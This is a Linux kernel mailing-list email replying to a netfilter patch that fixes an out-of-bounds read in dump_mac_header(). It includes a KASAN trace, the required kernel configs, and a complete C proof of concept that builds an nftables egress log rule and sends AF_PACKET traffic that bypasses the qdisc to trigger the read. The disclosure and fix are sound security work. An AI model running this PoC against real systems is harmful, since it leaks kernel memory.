Received: from mail-dl1-f51.google.com (mail-dl1-f51.google.com [74.125.82.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AEE9717B43F
	for <netfilter-devel@vger.kernel.org>; Mon,  8 Jun 2026 00:59:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.51
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780880381; cv=none; b=CUT6rEkWSldjv217KYPU4fIYjscX49lxHvPdkQb2t80Fu1VrRjt8gUh9XOl6SO2xCztKTQ1GeLJ3I3LZxRV5hfgZQ//h45JlKkP9ScbOlXrMofdcpN8Oe0fjY8+bL1lF1YB0Iy2PSuC9CKhUddMfAVtHuKXT2QV4YKBquVIrol8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780880381; c=relaxed/simple;
	bh=VnLO+6Han7+zae7UhrjUYifpFHPYk5p0gTjWRWaAIcY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=n9EZakab4TtdmuqHbJ9LV19VhG6IuNJB8tqchf+DGVL0FA2jGpcz3pvFjGso5KTFE/QjWuLc4heeSAYPZtYdr9FoMA/5qmxqDmN5kJxfhhDuQ25Iyq5M0HzxjWfGPkfy+PlGEf+VYQl/5j104trV+Gh5f6GzbWhyw9v5kj4ySjI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=gVBkQ0PB; arc=none smtp.client-ip=74.125.82.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="gVBkQ0PB"
Received: by mail-dl1-f51.google.com with SMTP id a92af1059eb24-138188a7dccso2640860c88.1
        for <netfilter-devel@vger.kernel.org>; Sun, 07 Jun 2026 17:59:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1780880379; x=1781485179; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=081syNgjc/OUEoNFW9sumXHhIpMY1vmSCncY+XJKHtM=;
        b=gVBkQ0PBMDK+ddCDiBR51e/vSUh7kA199BNURDsFuca2G54XoU25tNtAK8APhi6AoO
         Jz2mCQ0HtcnZFQk6i0J0VGhFC9lUCHso/VLb9JK3U1V/jW1aivvSRA3xYIGQxGOPiw4B
         WHgPMpHlqB+/z5MfvhzntprJbE7cRrcLaiVooFQPQy9CXoIIKnRG4294A5d2QLfBHULj
         akhswTM7e84wXaKg3UOGZGaVuJED3UzuDIKDHgDSw466A2lUFvkA5r2GhCUs3P/wkhYl
         JdPiG0lqrSTCma45STjvhmQ+TAWMYiXHxraZzJE6HBADBh7yKijlQSgQDKlxvdCNE08U
         oT7Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780880379; x=1781485179;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=081syNgjc/OUEoNFW9sumXHhIpMY1vmSCncY+XJKHtM=;
        b=M0nPDNiZOtH02xbTNour/IPXpWOtT9azCg/70v1JTRxsZo5HbjmbZ8zmVs9H0YI4yr
         DGQHw/7OVWXwD5xmOgtlptDH0zHCOq2iTXWfApt6v02oeTklTQO8zBWOc+qzxIpPL8B+
         HtoIewphwAWjs36HkodOzE4rCNbWjw2KLToFU9nBoDlR1Sa6yQCb8lO44oe6JhQJvAbJ
         lVFNR3ca2LWHdRvDTi+yMVgsucnKZNR4A9DmliVj3oNTY2T/6o9QQuW2W+yXgfOWrug2
         H2vKDkblxHE6t8LUfFO8jA/6mgW+41zpNV0NmOs1ekrzD7qSIVyoMRhVMrvTsO/O+CzZ
         HlgQ==
X-Gm-Message-State: AOJu0YyS1BwTDR30qO7i2RN2WtWRQOf3MuqliXhJmNhbIdXysr8XnC3/
	zloc7JxoLXHNDgtgLYJZdn4uhqxML+mQoFuyXjoMsHcS3pQya2pE80xg/YsZDbe3vxShjUBog1M
	aV8ut8IPs
X-Gm-Gg: Acq92OFrIMkck2SuwE3XOgBt4GK2UFOYnPpf7KkUR3CPKqb4ENsXpnxaSnh6I/UWuwJ
	wRfTAXOt8/fJBp9hBLojlK3QeFHSYKW17dwSu0jZPRtcgqLQXltdQLuGdPA6Ch+hPg8706JuNuI
	LDVI+uJqp7M+ZSUGlTO7D9fgPEcrc+bRWpX7fbm1GlpQXfHj5hh08qFTsERUtrOiNgpE2oMCZLd
	wZbkdpioYIgd0OJxFogrv+jiN9NG1HXWP8c/Eob2aWJFzh7rc++pCnkzwfaLA2idXPLnbdQgdlB
	KjbHRJnW9Hsm+QAS4HqaFgEpdJyp+cFFhitrLEJ0tweARj7F21rMOVV4CJMIcb1DmAAlUWNxi97
	ekIKam6OqVL+c2JtF30ieEHQyGLGNPZOpzNEpTTfARx7RXonsBiGp7aV4pguX5WRRKyWaSGph6z
	DlMskrqeQlYk1dOTwH
X-Received: by 2002:a05:7022:1e01:b0:137:ed87:8194 with SMTP id a92af1059eb24-1380666a35emr6410469c88.4.1780880378671;
        Sun, 07 Jun 2026 17:59:38 -0700 (PDT)
Received: from p1 ([2607:fb90:ecaf:d942:c23d:2198:9c43:68d4])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-137f5539035sm11452477c88.11.2026.06.07.17.59.37
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 07 Jun 2026 17:59:38 -0700 (PDT)
Date: Sun, 7 Jun 2026 17:59:34 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netfilter-devel@vger.kernel.org
Cc: Pablo Neira Ayuso <pablo@netfilter.org>, 
	Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>, davem@davemloft.net, 
	edumazet@google.com, Jakub Kicinski <kuba@kernel.org>, 
	Paolo Abeni <pabeni@redhat.com>, coreteam@netfilter.org, netdev@vger.kernel.org, 
	Weiming Shi <bestswngs@gmail.com>
Subject: Re: [PATCH nf] netfilter: nf_log: validate MAC header was set before
 dumping it
Message-ID: <mcjmrq6b3ffbf2embh7jeqfntjren55p3c4vqnpmnckpcxs5ov@j6l3z6cp3znv>
References: <20260608001124.309352-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260608001124.309352-1-xmei5@asu.edu>

On Sun, Jun 07, 2026 at 05:11:24PM -0700, Xiang Mei wrote:
> The fallback path of dump_mac_header() guards the MAC header access
> only with "skb->mac_header != skb->network_header", without checking
> skb_mac_header_was_set().  When the MAC header is unset, mac_header is
> 0xffff, so the test passes and skb_mac_header(skb) returns
> skb->head + 0xffff, ~64 KiB past the buffer; the loop then reads
> dev->hard_header_len bytes out of bounds into the kernel log.
> 
> This is reachable via the netdev logger: nf_log_unknown_packet() calls
> dump_mac_header() unconditionally, and an skb sent through AF_PACKET
> with PACKET_QDISC_BYPASS reaches the egress hook with mac_header still
> unset (__dev_queue_xmit(), which would reset it, is bypassed).
> 
> Add the skb_mac_header_was_set() check the ARPHRD_ETHER path already
> uses.  Only skbs with an unset MAC header are affected; valid ones are
> dumped as before.
> 
>  BUG: KASAN: slab-out-of-bounds in dump_mac_header (net/netfilter/nf_log_syslog.c:831)
>  Read of size 1 at addr ffff88800ea49d3f by task exploit/148
>  Call Trace:
>   kasan_report (mm/kasan/report.c:595)
>   dump_mac_header (net/netfilter/nf_log_syslog.c:831)
>   nf_log_netdev_packet (net/netfilter/nf_log_syslog.c:938 net/netfilter/nf_log_syslog.c:963)
>   nf_log_packet (net/netfilter/nf_log.c:260)
>   nft_log_eval (net/netfilter/nft_log.c:60)
>   nft_do_chain (net/netfilter/nf_tables_core.c:285)
>   nft_do_chain_netdev (net/netfilter/nft_chain_filter.c:307)
>   nf_hook_slow (net/netfilter/core.c:619)
>   nf_hook_direct_egress (net/packet/af_packet.c:257)
>   packet_xmit (net/packet/af_packet.c:280)
>   packet_sendmsg (net/packet/af_packet.c:3114)
>   __sys_sendto (net/socket.c:2265)
> 
> Fixes: 7eb9282cd0ef ("netfilter: ipt_LOG/ip6t_LOG: add option to print decoded MAC header")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-8
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/netfilter/nf_log_syslog.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/net/netfilter/nf_log_syslog.c b/net/netfilter/nf_log_syslog.c
> index 7a8952b049d1..ed5283fb6b67 100644
> --- a/net/netfilter/nf_log_syslog.c
> +++ b/net/netfilter/nf_log_syslog.c
> @@ -815,7 +815,7 @@ static void dump_mac_header(struct nf_log_buf *m,
>  
>  fallback:
>  	nf_log_buf_add(m, "MAC=");
> -	if (dev->hard_header_len &&
> +	if (dev->hard_header_len && skb_mac_header_was_set(skb) &&
>  	    skb->mac_header != skb->network_header) {
>  		const unsigned char *p = skb_mac_header(skb);
>  		unsigned int i;
> -- 
> 2.43.0
>
Thanks for your attention to this bug. Here are some tips for you to 
reproduce the crash.

Configs:
```
CONFIG_NF_TABLES=y
CONFIG_NF_TABLES_NETDEV=y
CONFIG_NFT_LOG=y
CONFIG_NF_LOG_SYSLOG=y
CONFIG_NETFILTER_EGRESS=y
CONFIG_PACKET=y
CONFIG_KASAN=y
```

PoC:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#ifndef PACKET_QDISC_BYPASS
#define PACKET_QDISC_BYPASS 20
#endif

#define DEV "eth0"
#define ETYPE 0x88b5
#define HLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))

static void *nla(void *b, uint16_t t, const void *d, size_t l)
{
	struct nlattr *a = b;
	a->nla_type = t;
	a->nla_len = HLEN + l;
	if (l)
		memcpy((char *)b + HLEN, d, l);
	size_t tot = NLA_ALIGN(HLEN + l);
	memset((char *)b + HLEN + l, 0, tot - HLEN - l);
	return (char *)b + tot;
}
static void *nstr(void *b, uint16_t t, const char *s)
{
	return nla(b, t, s, strlen(s) + 1);
}
static void *nbe(void *b, uint16_t t, uint32_t v)
{
	v = htonl(v);
	return nla(b, t, &v, 4);
}
static void *nbeg(void *b, uint16_t t)
{
	struct nlattr *a = b;
	a->nla_type = NLA_F_NESTED | t;
	a->nla_len = HLEN;
	return (char *)b + HLEN;
}
static void *nend(void *b, void *s)
{
	struct nlattr *a = (void *)((char *)s - HLEN);
	a->nla_len = HLEN + ((char *)b - (char *)s);
	size_t pad = NLA_ALIGN(a->nla_len) - a->nla_len;
	memset(b, 0, pad);
	return (char *)b + pad;
}

static struct nlmsghdr *msg(void *b, uint16_t type, uint16_t flags,
			    uint32_t seq, uint8_t fam, void **cur)
{
	struct nlmsghdr *h = b;
	struct nfgenmsg *g;
	h->nlmsg_type = type;
	h->nlmsg_flags = NLM_F_REQUEST | flags;
	h->nlmsg_seq = seq;
	h->nlmsg_pid = 0;
	g = (void *)((char *)h + NLMSG_HDRLEN);
	g->nfgen_family = fam;
	g->version = NFNETLINK_V0;
	g->res_id = 0;
	*cur = (char *)g + NLMSG_ALIGN(sizeof(*g));
	return h;
}
static void mend(struct nlmsghdr *h, void *c)
{
	h->nlmsg_len = (char *)c - (char *)h;
}

int main(void)
{
	setbuf(stdout, NULL);

	int s = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr = { 0 };
	strcpy(ifr.ifr_name, DEV);
	ioctl(s, SIOCGIFFLAGS, &ifr);
	ifr.ifr_flags |= IFF_UP;
	ioctl(s, SIOCSIFFLAGS, &ifr);
	close(s);

	int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	bind(nl, (void *)&sa, sizeof(sa));

	uint8_t buf[4096], *p = buf;
	void *c;
	struct nlmsghdr *h;
	memset(buf, 0, sizeof(buf));

	h = msg(p, NFNL_MSG_BATCH_BEGIN, 0, 1, AF_UNSPEC, &c);
	((struct nfgenmsg *)((char *)h + NLMSG_HDRLEN))->res_id =
		htons(NFNL_SUBSYS_NFTABLES);
	mend(h, c);
	p += h->nlmsg_len;

	h = msg(p, (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
		NLM_F_CREATE | NLM_F_ACK, 2, NFPROTO_NETDEV, &c);
	c = nstr(c, NFTA_TABLE_NAME, "t");
	mend(h, c);
	p += h->nlmsg_len;

	h = msg(p, (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
		NLM_F_CREATE | NLM_F_ACK, 3, NFPROTO_NETDEV, &c);
	c = nstr(c, NFTA_CHAIN_TABLE, "t");
	c = nstr(c, NFTA_CHAIN_NAME, "c");
	void *hk = nbeg(c, NFTA_CHAIN_HOOK);
	hk = nbe(hk, NFTA_HOOK_HOOKNUM, NF_NETDEV_EGRESS);
	hk = nbe(hk, NFTA_HOOK_PRIORITY, 0);
	hk = nstr(hk, NFTA_HOOK_DEV, DEV);
	c = nend(hk, (char *)c + HLEN);
	c = nstr(c, NFTA_CHAIN_TYPE, "filter");
	c = nbe(c, NFTA_CHAIN_POLICY, NF_ACCEPT);
	mend(h, c);
	p += h->nlmsg_len;

	h = msg(p, (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
		NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK, 4, NFPROTO_NETDEV, &c);
	c = nstr(c, NFTA_RULE_TABLE, "t");
	c = nstr(c, NFTA_RULE_CHAIN, "c");
	void *ex = nbeg(c, NFTA_RULE_EXPRESSIONS);
	void *el = nbeg(ex, NFTA_LIST_ELEM);
	el = nstr(el, NFTA_EXPR_NAME, "log");
	void *dt = nbeg(el, NFTA_EXPR_DATA);
	el = nend(dt, (char *)el + HLEN);
	ex = nend(el, (char *)ex + HLEN);
	c = nend(ex, (char *)c + HLEN);
	mend(h, c);
	p += h->nlmsg_len;

	h = msg(p, NFNL_MSG_BATCH_END, 0, 5, AF_UNSPEC, &c);
	((struct nfgenmsg *)((char *)h + NLMSG_HDRLEN))->res_id =
		htons(NFNL_SUBSYS_NFTABLES);
	mend(h, c);
	p += h->nlmsg_len;

	send(nl, buf, p - buf, 0);
	usleep(100000);

	int pk = socket(AF_PACKET, SOCK_DGRAM, htons(ETYPE));
	int one = 1;
	setsockopt(pk, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	struct sockaddr_ll sll = { 0 };
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(DEV);
	sll.sll_protocol = htons(ETYPE);
	sll.sll_halen = ETH_ALEN;
	memset(sll.sll_addr, 0xaa, ETH_ALEN);

	uint8_t pl[64];
	memset(pl, 0x41, sizeof(pl));
	for (int i = 0; i < 64; i++)
		sendto(pk, pl, sizeof(pl), 0, (void *)&sll, sizeof(sll));

	usleep(100000);
	puts("done");
	return 0;
}
```

Feel free to let me know if you can't reproduce it.

Xiang
